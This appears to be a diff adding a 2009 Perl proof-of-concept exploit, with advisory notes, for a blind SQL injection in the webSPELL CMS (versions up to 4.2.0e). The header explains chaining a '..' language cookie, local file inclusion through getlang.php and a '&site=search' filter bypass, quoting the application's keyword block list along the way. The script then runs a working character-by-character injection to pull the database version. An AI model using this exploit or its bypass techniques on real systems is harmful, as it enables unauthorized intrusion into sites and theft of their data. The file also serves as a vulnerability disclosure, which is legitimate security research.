@@ -1,0 +1,202 @@
+#!/usr/bin/perl
+use LWP::UserAgent;
+use HTTP::Cookies;
+use Getopt::Long;
+
+#                           \#'#/
+#                           (-.-)
+#    ------------------oOO---(_)---OOo-----------------
+#    |          __             __                     |
+#    |    _____/ /_____ ______/ /_  __  ______ ______ |
+#    |   / ___/ __/ __ `/ ___/ __ \/ / / / __ `/ ___/ |
+#    |  (__  ) /_/ /_/ / /  / /_/ / /_/ / /_/ (__  )  |
+#    | /____/\__/\__,_/_/  /_.___/\__,_/\__, /____/   |
+#    | Security Research Division      /____/ 2oo9    |
+#    --------------------------------------------------
+#    |    webSPELL <= v4.2.0e Blind SQL Injection     |
+#    --------------------------------------------------
+# [!] Discovered.: DNX
+# [!] Vendor.....: http://www.webspell.org
+# [!] Detected...: 26.04.2009
+# [!] Reported...: 02.05.2009
+# [!] Response...: 02.05.2009
+#
+# [!] Background.: webSPELL is a free Content Management System (CMS) for clans and gaming
+#                  communities, providing all needed features like forums, gallery, clanwar
+#                  system ...
+#
+# [!] Bug........: First of all i have to say the bug is a little bit tricky because it is
+#                  a mix of cookie injection, lfi, blind sql injection and a few bypasses of
+#                  security functions in this application.
+#
+# [!] Cookie Inj.: Let's start with the cookie injection. In _functions.php near line 337 we
+#                  find something like this:
+#
+#                  335: if($loggedin == false) {
+#                  336:         if(isset($_COOKIE['language'])) {
+#                  337:                 $_language->set_language($_COOKIE['language']);
+#                  338:         }
+#
+#
+#                  The function set_language() is in src/func/language.php near line 34:
+#
+#                  31: var $language_path = 'languages/';
+#
+#                  34: function set_language($to) {
+#                  35: 
+#                  36:         if(is_dir($this->language_path.$to)) {
+#                  37:                 $this->language = $to;
+#                  38:                 return true;
+#                  39:         } else return false;
+#                  40:
+#                  41: }
+#
+#                  We have to create a new cookie 'language' with the value '..' and set
+#                  with it $this->language to 'languages/..' which is very important.
+#
+#
+# [!] LFI........: In getlang.php near line 40:
+#
+#                  32: if(isset($_GET['modul'])) $modul = $_GET['modul'];
+#                  33: else $modul = null;
+#
+#                  39: if(!is_null($modul)){
+#                  40:         $_language->read_module($modul);
+#
+#
+#                  The function read_module() is in src/func/language.php near line 43:
+#
+#                  43: function read_module($module, $add=false) {
+#                  44:
+#                  45:         global $default_language;
+#                  46:
+#                  47:         if(file_exists($this->language_path.$this->language.'/'.$module.'.php')) $module_file = $this->language_path.$this->language.'/'.$module.'.php';
+#                  48:         elseif(file_exists($this->language_path.$default_language.'/'.$module.'.php')) $module_file = $this->language_path.$default_language.'/'.$module.'.php';
+#                  49:         elseif(file_exists($this->language_path.'uk/'.$module.'.php')) $module_file = $this->language_path.'uk/'.$module.'.php'; // UK as worst case
+#                  50:
+#                  51:         if(isset($module_file)) {
+#                  52:                 include($module_file);
+#
+#                  Now, we can include all *.php files with getlang.php?modul=pathtophpfile
+#                  (example: getlang.php?modul=awards)
+#                  Only php files otherwise you have to bypass mysql_real_escape_string() and
+#                  set %00 nullbyte.
+#
+#
+# [!] SQL Inject.: In awards.php near line 273:
+#
+#                  250: else {
+#                  251:         $page = (isset($_GET['page'])) ? $_GET['page'] : 1;
+#                  252:         $sort = (isset($_GET['page'])) ? $_GET['page'] : "date";
+#                  253:         $type = (isset($_GET['type'])) ? $_GET['type'] : "DESC";
+#
+#                  271:         else {
+#                  272:                 $start=$page*$max-$max;
+#                  273:                 $ergebnis = safe_query("SELECT * FROM ".PREFIX."awards ORDER BY $sort $type LIMIT $start,$max");
+#
+#                  Why we choose awards.php? As you can see in awards.php we don't have to
+#                  bypass slashes in the sql query ($sort and $type) and there is only an 
+#                  isset() check on these parameters.
+#
+#
+#                  There is also a check on _SERVER['QUERY_STRING'] we have to bypass. Let's
+#                  take a look at this function in _settings.php near line 71:
+#
+#                  71: if(isset($_GET['site'])) $site=$_GET['site'];
+#                  72: else $site= null;
+#                  73: if($site!="search") {
+#                  74:         $request=strtolower(urldecode($_SERVER['QUERY_STRING']));
+#                  75:         $protarray=array("union","select","into","where","update ","from","/*","set ",PREFIX."user ",PREFIX."user(",PREFIX."user`",PREFIX."user_groups","phpinfo",
+#                  76:         "escapeshellarg","exec","fopen","fwrite","escapeshellcmd","passthru","proc_close","proc_get_status","proc_nice",
+#                  77:         "proc_open","proc_terminate","shell_exec","system","telnet","ssh","cmd","mv","chmod","chdir","locate","killall",
+#                  78:         "passwd","kill","script","bash","perl","mysql","~root",".history","~nobody","getenv"
+#                  79:         );
+#                  80:         $check=str_replace($protarray, '*', $request);
+#                  81:         if($request != $check) system_error("Invalid request detected.");
+#                  82: }
+#
+#                  Looks hard to bypass? Not really ;) We easily add '&site=search' in our
+#                  injection to skip this interesting part.
+#
+#                  For a successful injection over awards.php we need at least 2 awards in
+#                  the output. This belongs to the injection and regular expression which
+#                  I used in the poc exploit.
+#
+# [!] Solution...: Upgrade to version 4.2.0f
+#
+
+if(!$ARGV[1])
+{
+  print "\n                          \\#'#/                      ";
+  print "\n                          (-.-)                       ";
+  print "\n   ------------------oOO---(_)---OOo------------------";
+  print "\n   | webSPELL <= v4.2.0e Blind SQL Injection Exploit |";
+  print "\n   |                  coded by DNX                   |";
+  print "\n   ---------------------------------------------------";
+  print "\n[!] Usage: perl webspell.pl [Host] [Path] <Options>";
+  print "\n[!] Example: perl webspell.pl 127.0.0.1 /webspell";
+  print "\n[!] Options:";
+  print "\n       -p [ip:port]    Proxy support";
+  print "\n";
+  exit;
+}
+
+my %options = ();
+GetOptions(\%options, "p=s");
+my $ua      = LWP::UserAgent->new();
+my $cookie  = HTTP::Cookies->new();
+my $host    = $ARGV[0];
+my $path    = $ARGV[1];
+my $target  = "http://".$host.$path;
+
+$cookie->set_cookie(undef, "language", "..", $path, $host);
+$ua->cookie_jar($cookie);
+
+if($options{"p"})
+{
+  $ua->proxy('http', "http://".$options{"p"});
+}
+
+print "[!] Exploiting...\n";
+
+get_sql_version();
+
+print "\n[!] Exploit done\n";
+
+sub get_sql_version
+{
+  syswrite(STDOUT, "[!] Get SQL Version: ", 21);
+  for(my $i = 1; $i <= 32; $i++)
+  {
+    my $found = 0;
+    my $h = 32;
+    while(!$found && $h <= 126)
+    {
+      if(exploit($i, $h))
+      {
+        $found = 1;
+        syswrite(STDOUT, chr($h), 1);
+      }
+      $h++;
+    }
+  }  
+}
+
+sub exploit
+{
+  my $i   = shift;
+  my $h   = shift;
+  my $url = $target."/getlang.php?modul=awards&page=(select case when (substring((select version()),".$i.",1)=CHAR(".$h.")) then awardID else NULL end)=1 -- &site=search";
+  my $res = $ua->get($url);
+  $res->content =~ /;awardID=(.*?)">.*?;awardID=(.*?)">/s;
+  if($1 > $2)
+  {
+    return 1;
+  }
+  else
+  {
+    return 0;
+  }
+}
+
+# milw0rm.com [2009-05-07]
